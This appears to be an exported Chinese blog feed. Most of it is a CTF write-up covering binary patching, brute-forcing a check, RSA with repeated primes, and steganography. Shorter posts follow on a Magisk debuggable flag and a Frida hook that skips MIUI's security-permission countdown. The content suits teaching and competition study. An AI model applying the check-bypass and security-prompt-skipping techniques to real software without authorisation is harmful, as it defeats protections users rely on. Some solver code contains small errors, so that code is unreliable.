<h3 id="Rev1"><a href="#Rev1" class="headerlink" title="Rev1"></a>Rev1</h3><p>运行发现点击动态菜单后左上角会出现菜单，点击后弹出提示<code>flag不在这里,一定是你的打开方式不对</code>。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-flagnothere.png"><br>应该是C++编写的GUI程序，IDA打开。Shift+F12找到该字符串，定位到关键代码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-ida-flagnothere.png"><br><code>Show flag</code>菜单并没有出现，对应的点击事件是7u，非常可疑。于是把点击<code>flag不在这里...</code>对应的id改成7(截图中已修改，原本为6)，这样就会跳转到case 7u了。<br>保存后运行：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-patched.png"><br>直接点击确定弹出提示框<code>failed</code>，于是搜索字符串定位到<code>DialogFunc</code>函数：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-ida-df.png"><br>可以看到它取了前两个输入框字符串的前十位，再转化成int，点开<code>sub_4022C0</code>函数，功能是将这两个int值存入数组，由下面两个数字看出，是md5算法（后面动态调试也验证了），所以a b分别为：1732584193，-271733879;<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-ida-md5.png"><br>看关键函数sub_401920，只有它返回1才会提示”success”<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev1-ida-compare.png"><br>（sub_4019B0是一个计算的函数，后面会贴出来。）<br>逻辑就是将md5后得到的字节集逐位比较，如果16位的计算结果全部符合才不会返回0。Dump出dword_407060 和dword_407064写程序爆破即可。<br>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xx = ((<span class="number">4</span> * (<span class="number">4</span> * (<span class="number">4</span> * (a1 ^ <span class="number">276</span>) ^ <span class="number">1300</span>) ^ <span class="number">6425</span>) ^ <span class="number">2064</span>) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">return</span> xx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> arr0[] = &#123;<span class="number">0xAF</span>, <span class="number">0x97</span>, <span class="number">0x9B</span>, <span class="number">0xBF</span>, <span class="number">0xAF</span>, <span class="number">0xAB</span>, <span class="number">0x93</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xAF</span>, <span class="number">0x9B</span>, <span class="number">0xAF</span>, <span class="number">0x83</span>, <span class="number">0xAB</span>, <span class="number">0xB3</span>, <span class="number">0xB3</span>, <span class="number">0x8F</span>, <span class="number">0x9F</span>, <span class="number">0x9F</span>, <span class="number">0xBF</span>, <span class="number">0xB3</span>, <span class="number">0x83</span>, <span class="number">0xA3</span>, <span class="number">0x97</span>, <span class="number">0x83</span>, <span class="number">0xBF</span>, <span class="number">0x9F</span>, <span class="number">0xA3</span>, <span class="number">0xB3</span>, <span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0xBB</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> arr1[] = &#123;<span class="number">0x97</span>, <span class="number">0x9B</span>, <span class="number">0xBF</span>, <span class="number">0xAF</span>, <span class="number">0xAB</span>, <span class="number">0x93</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xAF</span>, <span class="number">0x9B</span>, <span class="number">0xAF</span>, <span class="number">0x83</span>, <span class="number">0xAB</span>, <span class="number">0xB3</span>, <span class="number">0xB3</span>, <span class="number">0x8F</span>, <span class="number">0x9F</span>, <span class="number">0x9F</span>, <span class="number">0xBF</span>, <span class="number">0xB3</span>, <span class="number">0x83</span>, <span class="number">0xA3</span>, <span class="number">0x97</span>, <span class="number">0x83</span>, <span class="number">0xBF</span>, <span class="number">0x9F</span>, <span class="number">0xA3</span>, <span class="number">0xB3</span>, <span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0xBB</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> arrRes[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0xff</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check1</span>(j / <span class="number">16</span>) == arr1[<span class="number">2</span> * i] &amp;&amp; <span class="built_in">check1</span>(j % <span class="number">16</span>) == arr1[<span class="number">2</span> * i])</span><br><span class="line">            &#123;</span><br><span class="line">                arrRes[i] = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理arrRes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>arrRes转成16进制字符串得到<code>b56fba455b6b0acc377fc0850f78c87e</code><br>cmd5查询得到<code>inithex</code><br>所以flag为：<br><code>flag&#123;inithex&#125;</code></p>
<h3 id="Rev2"><a href="#Rev2" class="headerlink" title="Rev2"></a>Rev2</h3><p>是一个<code>.Net</code>编写的程序，使用<code>DnSpy</code>反编译，定位到按钮点击事件<code>btnLogin_Click</code>，关键代码：（将53个int转换为char并提示框输出）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev2-dnspy-click1.png"><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-rev2-dnspy-click2.png"><br>直接将这块if判断去掉（省得输入账户名和密码，其实只是明文比较），然后删掉提示框和退出代码，改为<code>this.txtUsername.Text = expr_1B;</code>（方便复制）<br>点击登录后得到flag:<br><code>flag&#123;ST0RING_STAT1C_PA55WORDS_1N_FIL3S_1S_N0T_S3CUR3&#125;</code></p>
<h3 id="Confused"><a href="#Confused" class="headerlink" title="Confused"></a>Confused</h3><p>这题是DDCTF2019的原题改编，大致思路是还原成vm分支，并反编译出原始的字节码，再看逻辑。但是由于有官方以及其他大佬的writeup，就可以直接跳过这一步了。<br>直接dump出vmp的字节码（0000000100001984到0000000100001A5F段），使用脚本提取并转换得到flag，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot2</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)+<span class="number">2</span>-<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)+<span class="number">2</span>-<span class="number">65</span>)%<span class="number">26</span>+<span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span> ,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">byte = f.read()</span><br><span class="line">hexstr = binascii.b2a_hex(byte).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line">code = <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(hexstr))</span><br><span class="line">data = re.findall(<span class="string">r&quot;\\xf0\\x10(.)&quot;</span>, code)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(rot2(x),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到<code>wellDoneYouGotFlag</code>，补上flag{}, 即为<br><code>flag&#123;wellDoneYouGotFlag&#125;</code></p>
<h3 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h3><p>这是一道windows x64驱动题，IDAx64打开，发现是kmdf驱动，在驱动入口(<code>DriverEntry</code>)找到初始化函数<code>sub_14000136C</code><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-driver-ida-de.png"><br><code>sub_14000136C</code>伪代码（已重命名<code>DeviceIOControl</code>对应的函数为<code>EvtIoDeviceControl</code>）：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-driver-ida-init.png"><br>查<code>MajorFunction ARRAY</code>得知<code>MajorFunction[14]</code>对应的就是<code>DeviceIOControl</code>的回调事件，点开该函数：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/isc2019-driver-ida-eidc.png"><br>有一个判断，比较IRP结构体中的某个参数，猜测<code>2236608</code>就是<code>DeviceIOControl</code>的控制码，转为16进制得到<code>0x2220C0</code>，得到flag：<code>flag&#123;0x2220C0&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="这不是RSA"><a href="#这不是RSA" class="headerlink" title="这不是RSA"></a>这不是RSA</h3><p>解压得到加密脚本和密文txt，加密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">78254248636015593835240633798863091700627717386691577477092682528163871016876505150029125504913239471031625603543714863111930320484046060277104490993992760201739654592985790646481874929501002685674693070932718419433233282362127481768346180682337775258548134665766168438958869215232287958331412209851903015993147813403335636241185471268696861237357489</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">cipher= <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;enc =\n&#x27;</span>, long_to_bytes(cipher).encode(<span class="string">&#x27;base64&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用<code>yafu</code>分解n得到三个素数，所以并不是常见的双素数RSA（照应标题）<br>计算逆元<code>d=gmpy2.invert(e,(p-1)*(q-1)*(r-1))</code>，然后解密<br>完整解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">770844001450150079027</span></span><br><span class="line">q = <span class="number">770844001450150079027</span></span><br><span class="line">r = <span class="number">131696711774631388724696374141133302602864637655367012223684455998047506211758798362800780190209887743575322213844983227253151336958534430970453483593114760962550640332722427237065424337658925348481895740606075180895738536517015514878001551520897972712812008434603925106486775952953967700332121413344165370441</span></span><br><span class="line">p = gmpy2.mpz(p)</span><br><span class="line">q = gmpy2.mpz(q)</span><br><span class="line">r = gmpy2.mpz(r)</span><br><span class="line">N = p*q*r</span><br><span class="line"></span><br><span class="line">phi = (p)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = <span class="string">&quot;6BVlzzRsSLMRXld3VuLjsFLWMk4BbsF/o5aCfj/CMv4HCnLeBX6Iejhy4+NstQtTL/zb6cPv5RJVpddt7ddoT0iyTBmKZl2qmwMg7aoXqCobfhbj/hstU0T/Rod0TPIteLWUKUXMvdPZZYXSeMyqAy9ZrkD2uDvetieZaMZD0BpmyERB4nVSVxPhG9NPq+P36Q==&quot;</span></span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">c = binascii.hexlify(c)</span><br><span class="line">c = <span class="built_in">int</span>(c,<span class="number">16</span>)</span><br><span class="line">res = gmpy2.powmod(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dec&quot;</span>,res)</span><br><span class="line">hexstr = <span class="built_in">hex</span>(res)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dec_hex&quot;</span>,hexstr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dec_ascii&quot;</span>,binascii.unhexlify(hexstr).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>提示查看公告，公告部分内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 未特殊说明, flag的形式均为flag&#123;xxx&#125;</span><br><span class="line">6. Have fun;</span><br><span class="line">▢我已阅读并同意遵守公告内容</span><br></pre></td></tr></table></figure>
<p><code>xxx</code>和<code>我已阅读并同意遵守公告内容</code>的背景色相同，所以flag为：<br><code>flag&#123;我已阅读并同意遵守公告内容&#125;</code></p>
<h3 id="流浪地球"><a href="#流浪地球" class="headerlink" title="流浪地球"></a>流浪地球</h3><p>2019iscc Misc中的welcome，稍作修改<br>文本中只出现了这两个词组，频率如下：</p>
<blockquote>
<p>點燃 木星：6270<br>流浪地球 計劃：3802<br>所以把前者替换为0，后者替换为1，得到一大串二进制数。<br>根据提示：八位小端，写脚本转换</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quotquot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(b):</span><br><span class="line">    s = b[i:i+<span class="number">8</span>]<span class="comment">#8位</span></span><br><span class="line">    s= s[::-<span class="number">1</span>]<span class="comment">#小端</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(s,<span class="number">2</span>))</span><br><span class="line">    i += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V KWOI CWOVIQ, TXN V JWPQVMIR CWQN WA NUIC DRI PWN ZWRNU WA SWVPS NW NUI NUIDNIR. NUI NRDVKIR TWXSUN CI NW NUI NUIDNIR AWR QIOIRDK RIDQWPQ.</span><br><span class="line"></span><br><span class="line">&quot;ZUDN ZVKK UDLLIP VA NUI QXP MVQDLLIDR?&quot; &quot;UWZ UXCDP TIVPSQ QXROVOI VA NUI QXP IELKWMIQ?&quot; NUIRI DRI SWWM AVJNVWPQ DPM QIRVWXQ QJVIPJI TIUVPM NUI NZW BXIQNVWPQ, TXN NUIRI VQ PIOIR D CWOVI NDKGVPS DTWXN VN.</span><br><span class="line"></span><br><span class="line">CDGVPS D SWWM QJV-AV, YWX PIIM SWWM QJVIPJI TIUVPM VN. NUIRI DRI D KWN WA LUYQVJQ B&amp;D AWR QCDKK MINDVKQ VP NUVQ CWOVI. &quot;ZUY PWN FXQN TXVKM RWJGIN QUVLQ DPM</span><br><span class="line">NDGI UXCDP TIVPSQ NW DPWNUIR LKDPIN?&quot; &quot;ZUY DNCWQLUIRI LRIQQXRI UDQ DPYNUVPS NW MW ZVNU KVAN AWRJI AWR DP DVRJRDAN?&quot; ZUIP V ZDQ D GVM, V XQIM NW NUVPG DKK QJV-AV CWOVIQ QUWXKM CDGI QJVIPNVAVJ QIPQI. V RIDKVHIM UWZ LRIJVWXQ VN VQ D QJV-AV CWOVI JUWWQI NW QNVJG NW QJVIPNVAVJ DJJXRDNI. IOIP ZUIP VPOIQNWR ZVNUMRIZ NUI CWPIY TIJDXQI NUIY NUVPG VQ NWW UDRM-JWRI DPM ZVKK UDOI PW CDRGIN.</span><br><span class="line"></span><br><span class="line">NUI QNWRY, VQ RIDKKY DTWXN UWZ LIWLKI JUWWQI NW UIKL IDJU WNUIR DPM TWPM ZVNU IDJU WNUIR DPM UWZ LIWLKI JUWWQI NW QDJRVAVJI. NUI WPKY QLWVKIR V ZVKK NIKK YWX VQ:</span><br><span class="line"></span><br><span class="line">TIVFVPS PW.3 NRDPQLWRNDNVWP MVOVQVWP RICVPMQ YWX. RWXNIQ DRI JWXPNKIQQ. QDAINY VQ AWRICWQN. XPRISXKDNIM MRVOVPS. KWOIM WPIQ IPM XL VP NIDRQ.</span><br><span class="line"></span><br><span class="line">DPM LRILDRI NW JRY AWR NUI QNWRY.</span><br><span class="line"></span><br><span class="line">AKDS&#123;NUIZDPMIRVPSIDRNU_YFGBBYNBKK&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>WinCrypto</code>进行词频分析，得到flag<br><code>FLAG&#123;THEWANDERINGEARTH_YJKQQYTQLL&#125;</code></p>
<h3 id="Executable"><a href="#Executable" class="headerlink" title="Executable"></a>Executable</h3><p>得到一个后缀名为exe的文件，使用<code>010Editor</code>打开，发现实际上是由PNG和ZIP拼接而成，第一个字节做了修改，修正后得到一张二维码，解析得到<br><code>pass&#123;Nope!&#125;</code><br>压缩包密码：<code>Nope!</code><br>压缩包中有100个二维码png，使用脚本解析发现是base64后的字符串，再次解码得到提示：<code>flag_is_not_here</code><br>所以flag不在二维码中<br>查看这一百个文件发现有一个大小异常，10k（其他都是1k, 2k）<br>使用<code>010Editor</code>打开，发现后面附有一个zip文件，解压后打开txt得到flag<br><code>flag&#123;U_R_S0_Sp3ciA1&#125;</code></p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><h3 id="HelloCTF"><a href="#HelloCTF" class="headerlink" title="HelloCTF"></a>HelloCTF</h3><p>逆向发现是Flutter框架写的，以前没逆向过这种app，所以这题卡了很久。<br>查看网上关于该框架源码的解析，突然想到会不会输出日志。<br>于是打开<code>Android Studio</code>，连上手机，查看LogCat<br>点击获取flag按钮后，app输出了一串base64后的字符串，尝试输入base64解码后的字符串，提示密码错误。<br>直接填入base64后的字符串得到flag<br><code>flag&#123;h4l10_Ctffff&#125;</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52pojie.cn/thread-933705-1-1.html">2019DDCTF部分wp</a><br><a href="https://www.anquanke.com/post/id/178414">DDCTF2019官方Write Up——Reverse篇</a><br><a href="https://www.jianshu.com/p/de8ad7c070c9">iscc2019 misc</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTeX公式复制到Word中显示</title>
    <url>/2019/09/14/latex-to-word-in-mathml/</url>
    <content><![CDATA[<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>Word是可以直接使用<code>LaTeX</code>公式的，本文适用于已经使用<code>LaTeX</code>写好的论文。<br>方法：插入-公式-插入新公式，然后点击设计，选择<code>LaTeX</code>。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>LaTeX</code>公式直接复制到word的公式编辑中效果可能不太好，而且不太方便。<br>这里通过<code>MathML</code>作为中间格式进行转换。</p>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h2 id="文件转换（建议使用）"><a href="#文件转换（建议使用）" class="headerlink" title="文件转换（建议使用）"></a>文件转换（建议使用）</h2><h3 id="文件转换工具pandoc"><a href="#文件转换工具pandoc" class="headerlink" title="文件转换工具pandoc"></a><a href="https://pandoc.org/">文件转换工具pandoc</a></h3><p>该工具能把tex文件整体转换为docx文件，执行以下命令（homework自行替换）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pandoc homework.tex -o homework.docx</span><br></pre></td></tr></table></figure>

<h2 id="公式转换为MathML"><a href="#公式转换为MathML" class="headerlink" title="公式转换为MathML"></a>公式转换为MathML</h2><p>以$\bar{x}$为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\bar&#123;x&#125;</span><br></pre></td></tr></table></figure>
<h3 id="latex、MathML在线互转"><a href="#latex、MathML在线互转" class="headerlink" title="latex、MathML在线互转"></a><a href="https://johnmacfarlane.net/texmath">latex、MathML在线互转</a></h3><p>结果为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">display</span>=<span class="string">&quot;block&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1998/Math/MathML&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mover</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mo</span> <span class="attr">accent</span>=<span class="string">&quot;true&quot;</span>&gt;</span>‾<span class="tag">&lt;/<span class="name">mo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mover</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用MathJax转换"><a href="#使用MathJax转换" class="headerlink" title="使用MathJax转换"></a>使用MathJax转换</h3><p>同样打开<a href="https://johnmacfarlane.net/texmath">texmath demo</a><br>右键顶部的公式，<code>Show Math As</code>，选择<code>MathML</code>即可<br>结果为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1998/Math/MathML&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mrow</span> <span class="attr">class</span>=<span class="string">&quot;MJX-TeXAtom-ORD&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mover</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mo</span> <span class="attr">stretchy</span>=<span class="string">&quot;false&quot;</span>&gt;</span><span class="symbol">&amp;#x00AF;</span><span class="comment">&lt;!-- ¯ --&gt;</span><span class="tag">&lt;/<span class="name">mo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mover</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mrow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="在word中以纯文本形式粘贴"><a href="#在word中以纯文本形式粘贴" class="headerlink" title="在word中以纯文本形式粘贴"></a>在word中以纯文本形式粘贴</h3><p>enjoy it.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/66ed4c8edfd4">公式图片转latex神器Mathpix以及latex公式与word公式的相互转换</a></p>
]]></content>
      <tags>
        <tag>LaTeX</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux配置虚拟内存文件</title>
    <url>/2020/03/25/linux-set-swapfile/</url>
    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="查询当前内存"><a href="#查询当前内存" class="headerlink" title="查询当前内存"></a>查询当前内存</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure>
<h3 id="创建交换文件"><a href="#创建交换文件" class="headerlink" title="创建交换文件"></a>创建交换文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch /root/swapfile</span><br><span class="line">dd if=/dev/zero of=/root/swapfile bs=1M count=4096</span><br></pre></td></tr></table></figure>
<h3 id="格式化交换文件"><a href="#格式化交换文件" class="headerlink" title="格式化交换文件"></a>格式化交换文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkswap /root/swapfile</span><br></pre></td></tr></table></figure>
<h3 id="启用交换文件"><a href="#启用交换文件" class="headerlink" title="启用交换文件"></a>启用交换文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapon /root/swapfile</span><br></pre></td></tr></table></figure>
<h3 id="配置开机自动加载"><a href="#配置开机自动加载" class="headerlink" title="配置开机自动加载"></a>配置开机自动加载</h3><p>在<code>/etc/fstab</code>文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/swapfile swap swap defaults 0 0</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/fae46241ba0c">Linux设置虚拟内存</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Magisk指令修改 ro.debuggable（不刷机）</title>
    <url>/2019/09/15/magisk-set-debuggable/</url>
    <content><![CDATA[<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="使用magisk指令修改："><a href="#使用magisk指令修改：" class="headerlink" title="使用magisk指令修改："></a>使用magisk指令修改：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">stop;start;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.renyiwei.com/archives/1704.html">Android修改ro.debuggable 华为真机adb调试所有进程</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Frida绕过MIUI 12系统设置倒计时</title>
    <url>/2021/10/02/miui-countdowntimer-bypass/</url>
    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p>完整项目见<a href="https://github.com/XhyEax/MIUICustom">MIUICustom</a></p>
<p>注意：该模块仅测试于<code>手机管家</code>（<code>5.4.0</code>、<code>5.6.0</code>、<code>7.2.1</code>），其他版本未测试。</p>
<p>如果模块未生效，可自行反编译apk，查找并替换Hook点，自行编译Xposed模块。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>每次修改系统设置（设置通知使用权、允许app安装未知应用、开启无障碍功能等），都会有10秒倒计时，使用起来很不方便。</p>
<p>于是考虑使用<code>Frida</code>绕过倒计时，并开发<code>Xposed</code>模块。</p>
<span id="more"></span>
<h2 id="倒计时类型"><a href="#倒计时类型" class="headerlink" title="倒计时类型"></a>倒计时类型</h2><p>主要有以下两种：</p>
<table>
<thead>
<tr>
<th align="center"><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/miui-dialog-1.jpg"></th>
<th align="center"><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/miui-dialog-2.jpg"></th>
</tr>
</thead>
</table>
<p>查看前台Activity：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys activity activities | findstr &quot;mFocused&quot;</span><br></pre></td></tr></table></figure>
<p>可以发现两个对话框都来自手机管家，分别对应：<br><code>com.miui.permcenter.privacymanager.SpecialPermissionInterceptActivity</code><br><code>com.miui.permcenter.install.AdbInputApplyActivity</code></p>
<p>后者已经有分析文章了，见<a href="https://www.52pojie.cn/thread-1274517-1-1.html">MIUI 12稳定版系统中的开发者选项限制解除</a>。<br>也可以直接改配置文件，见<a href="https://www.52pojie.cn/thread-1282827-1-1.html">需root，无需xp和frida，miui开发者选项限制解除</a></p>
<h2 id="7-2-1-Hook点"><a href="#7-2-1-Hook点" class="headerlink" title="7.2.1 Hook点"></a>7.2.1 Hook点</h2><p><code>com.miui.permcenter.privacymanager.InterceptBaseFragment</code>的<code>n</code>函数，主动调用<code>d</code>函数。</p>
<h3 id="Frida脚本验证"><a href="#Frida脚本验证" class="headerlink" title="Frida脚本验证"></a>Frida脚本验证</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.use(<span class="string">&quot;com.miui.permcenter.privacymanager.InterceptBaseFragment&quot;</span>).n.overload()</span><br><span class="line">        .implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.d(<span class="literal">true</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="5-6-0-Hook点"><a href="#5-6-0-Hook点" class="headerlink" title="5.6.0 Hook点"></a>5.6.0 Hook点</h2><p><code>com.miui.permcenter.privacymanager.f</code>的<code>n</code>函数，主动调用<code>d</code>函数。</p>
